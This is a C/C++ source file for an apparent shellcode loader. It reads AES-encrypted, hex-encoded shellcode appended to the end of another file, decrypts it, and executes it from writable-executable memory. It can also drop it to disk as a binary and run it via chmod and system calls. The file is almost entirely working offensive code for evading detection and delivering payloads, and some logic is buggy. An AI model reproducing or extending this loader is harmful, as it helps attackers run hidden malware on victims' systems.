#include <stdio.h>
#include <stdlib.h>
#include<string.h>
#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif

#ifndef SHELLCODE_LOADER_H
#include "shellcode_loader.h"
#endif

#include "aes_sources/aes_crypter.h"

short detect_os()
{

    #if __APPLE__
        return 2;
    #elif _WIN32
        return 1;
    #elif __LINUX__
        return 0;
    #elif BSD
        return 3;
    #elif __unix__
        return 4;
    #else
        return -1;
    #endif
    
    //printf("%d\n", OS);
}

shellcode_loader::shellcode_loader()
{

    //

}

shellcode_loader::~shellcode_loader()
{

    //

}

void shellcode_loader::get_key_from_txt( char * path_to_txt, unsigned char * target_key_buffer )
{

    

}

void shellcode_loader::load_shellcode_from_file( char * path_to_file, char * encrypted_shellcode_string )
{

    FILE * target_file = fopen(path_to_file,"r");

    fscanf( target_file, "%s", encrypted_shellcode_string);

}

void shellcode_loader::process_encoded_shellcode( char * encoded_shellcode, char * shellcode_buffer, int string_length )
{

    int j = 0;

    for(int i=0; /* i<strlen(encoded_shellcode) */ i < string_length; i += 2,j++)
    {

        char min_buff[3];
        strcpy(min_buff,"");
        min_buff[0] = encoded_shellcode[i];
        min_buff[1] = encoded_shellcode[i+1];
        shellcode_buffer[j] = strtol(min_buff,NULL,16);
        //printf("%d\n", shellcode_buffer[j]);

    }

    shellcode_buffer[j] = 0;

}

void shellcode_loader::execute_shellcode( char * target_shellcode )
{

    void (*sc)();

    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, target_shellcode, strlen(target_shellcode) + 1 );
    //execute shell
    ( ( void(*)() )ptr )();

}

void shellcode_loader::process_shellcode_string( char * target_shellcode_string, char * shellcode_buffer )
{

    int j = 0;

    for(int i=0;i<strlen(target_shellcode_string);i += 4)
    {
        char sm_buff[3];
        sm_buff[0] = target_shellcode_string[i+2];
        sm_buff[1] = target_shellcode_string[i+3];
        int target_val = strtol(sm_buff,NULL,16);
        shellcode_buffer[j] = target_val;
        j++;
        //printf("%d\n", target_val);
    }

    shellcode_buffer[j] = 0;

}

void shellcode_loader::decrypt_encoded_shellcode( char * encoded_shellcode, char * shellcode_buffer, unsigned char * key, unsigned int shell_length )
{

    unsigned char * shell_buff = (unsigned char *)malloc( shell_length + 1 );

    for (int i = 0; i < shell_length; i++) shell_buff[i] = encoded_shellcode[i];

    aes_crypter::decrypt_string( shell_buff, shell_length, key, shellcode_buffer );

    free(shell_buff);

}

void shellcode_loader::load_shellcode_from_file_easy( char * path_to_file, char * target_key )
{

    char buffer_1[10000],buffer_2[10000],sm_buff[17];
    unsigned char crypt_buffer[10000];
    unsigned char key[50] = {0};

    strcpy(buffer_1,"");
    strcpy(buffer_2,"");

    shellcode_loader::load_shellcode_from_file(path_to_file,buffer_1);

    unsigned int shell_length = strlen(buffer_1) / 2;
    strcpy( sm_buff, buffer_1 + ( strlen(buffer_1) - 8 ) );

    //eliminating string_length from string
    for (int i = strlen(buffer_1) - 8; i < strlen(buffer_1); i++) buffer_1[i] = 0;

    int string_length = strtol(sm_buff,NULL,16);
    //printf("%s %s %d\n", buffer_1, sm_buff, string_length );
    //printf("%d\n", string_length);
    //printf("%s\n", target_key);

    aes_crypter::string_to_unsigned( buffer_1,crypt_buffer );
    aes_crypter::char_array_to_unsigned( target_key,key );

    //for (int i = 0; i < string_length; i++) printf("%d ", crypt_buffer[i]);
    //printf("\n");

    //for(int i=0;i<32;i++) printf("%c", key[i]);
    //printf("\n");

    aes_crypter::decrypt_string( crypt_buffer, string_length, key, buffer_2 );
    //printf("%s\n", buffer_2);
    strcpy(buffer_1,"");
    shellcode_loader::process_encoded_shellcode(buffer_2,buffer_1,string_length);
    shellcode_loader::execute_shellcode( buffer_1 );

}

int shellcode_loader::get_byte_file_size( char * file_content, int buffer_size )
{

    int i=buffer_size - 1;
    while( file_content[i] == 0 ) i--;
    return i + 1;

}

void shellcode_loader::load_shellcode_from_file_bytes( char * path_to_file, char * target_key, int opt = 1 )
{

    FILE * fp = fopen(path_to_file,"rb");

    char sm_buff[10];
    unsigned char key[50] = {0};

    fseek(fp, 0L, SEEK_END);
    int content_buffer_len = ftell(fp);
    char * content_buffer = (char *)malloc( content_buffer_len );
    unsigned char * crypt_buffer = (unsigned char *)malloc( content_buffer_len );
    memset(content_buffer,0,content_buffer_len);
    memset(crypt_buffer,0,content_buffer_len);

    char * encrypted_shellcode_string = (char *)malloc( content_buffer_len );

    fp = fopen(path_to_file,"rb");
    fread(content_buffer, content_buffer_len, 1, fp);

    //printf("%d %s\n", strlen(content_buffer), content_buffer );

    int file_size = shellcode_loader::get_byte_file_size( content_buffer,content_buffer_len );

    //printf("%d\n", content_buffer[ file_size - 1 ] );

    strcpy(sm_buff,"");

    int shell_size = int((unsigned char)( content_buffer[ content_buffer_len - 4 ] ) << 24 |
            (unsigned char)( content_buffer[ content_buffer_len - 3 ] ) << 16 |
            (unsigned char)( content_buffer[ content_buffer_len - 2 ] ) << 8 |
            (unsigned char)( content_buffer[ content_buffer_len - 1 ] ));

    //printf("%d\n", shell_size);

    strcpy(encrypted_shellcode_string,"");
    int j = 0;
    for(int i=content_buffer_len - shell_size - 4; i<content_buffer_len - 4; i++,j++)
    {
        encrypted_shellcode_string[j] = content_buffer[i];
    }
    encrypted_shellcode_string[j] = 0;
    int encrypted_shellcode_string_len = j;

    int string_length = 0;
    for(int i=encrypted_shellcode_string_len - 4,shift_left = 24;i<encrypted_shellcode_string_len;i++,shift_left -= 8)
    {
        string_length += encrypted_shellcode_string[i] << shift_left;
        //eliminating string length from enc shell string
        encrypted_shellcode_string[i] = 0;
    }
    //printf("%d\n",string_length);

    //printf("%d %s\n", encrypted_shellcode_string_len, sm_buff );
    //for (int i = 0; i < encrypted_shellcode_string_len; i++) printf("%d ", encrypted_shellcode_string[i]);
    //printf("\n");

    //printf("%s %d\n", encrypted_shellcode_string, string_length);

    aes_crypter::char_array_to_unsigned( encrypted_shellcode_string,crypt_buffer,string_length );
    aes_crypter::char_array_to_unsigned( target_key,key );

    //for (int i = 0; i < strlen(encrypted_shellcode_string); i++) printf("%d ", crypt_buffer[i]);
    //printf("\n");

    //for (int i = 0; i < string_length; i++) printf("%d ", crypt_buffer[i]);
    //printf("\n");

    //for(int i=0;i<32;i++) printf("%c", key[i]);
    //printf("\n");

    strcpy(content_buffer,"");
    strcpy(encrypted_shellcode_string,"");

    aes_crypter::decrypt_string( crypt_buffer, string_length, key, encrypted_shellcode_string );
    shellcode_loader::process_encoded_shellcode(encrypted_shellcode_string,content_buffer,string_length);
    if( opt == 1 ) shellcode_loader::execute_shellcode( content_buffer );
    else if( opt == 2 )
    {
        FILE * fw = fopen("test","wb");

        short os = detect_os();
        //custom system command to execute binary file
        if( os == 1 )
        {
            //printf("windows\n");
        }
        else if( os == 2 || os == 0 )
        {
            //printf("linux\n");
            system("chmod 700 test");
            //don't forget to sleep
            sleep(5);
            system("./test");
            //system("rm test");

        }

        fwrite(content_buffer,string_length/2,1,fw);
        fclose(fw);
    }

    free(encrypted_shellcode_string);
    free(content_buffer);
    free(crypt_buffer);
    fclose(fp);

}
 
int main(int argc, char **argv) {
    
    //printf("nothing\n");

    char * new_shell = (char *)malloc( 1000 );
    char * buff_1 = (char *)malloc( 1000 );
    char * key_buff = (char *)malloc( 50 );

    FILE * fr = fopen( "random.txt","r" );

    fscanf(fr,"%s",new_shell);

    shellcode_loader::process_shellcode_string( new_shell, new_shell );

    //printf("%d\n", new_shell[0]);

    //shellcode_loader::execute_shellcode( new_shell );

    shellcode_loader::load_shellcode_from_file("key.txt",key_buff);

    //shellcode_loader::load_shellcode_from_file_easy( "testing.txt",key_buff );

    /*int i=0;
    while( test_buff_2[i] != 0)
    {
        printf("%d ", test_buff_2[i]);
        i++;
    }*/

    strcpy(buff_1,"injected.txt");

    shellcode_loader::load_shellcode_from_file_bytes( buff_1,key_buff,2 );

    free(new_shell);
    free(buff_1);
    free(key_buff);

    return 0;
}